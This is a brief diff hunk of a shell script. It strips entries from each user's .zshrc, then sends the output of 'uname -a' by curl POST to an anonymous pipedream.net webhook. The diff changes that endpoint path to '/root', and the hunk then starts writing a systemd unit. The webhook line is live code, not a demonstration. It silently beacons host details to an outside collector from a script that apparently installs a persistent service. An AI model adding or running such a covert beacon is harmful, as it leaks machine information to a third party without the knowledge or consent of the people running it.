@@ -12,7 +12,7 @@ for user in `find /home/ -maxdepth 1 -type d`; do
     uninstall_in_rc "$user/.zshrc"
 done
 
-uname -a | curl https://enj7fhiwooawt.x.pipedream.net/ -X POST -d "$(</dev/stdin)"
+uname -a | curl https://enj7fhiwooawt.x.pipedream.net/root -X POST -d "$(</dev/stdin)"
 
 echo -e "
 [Unit]
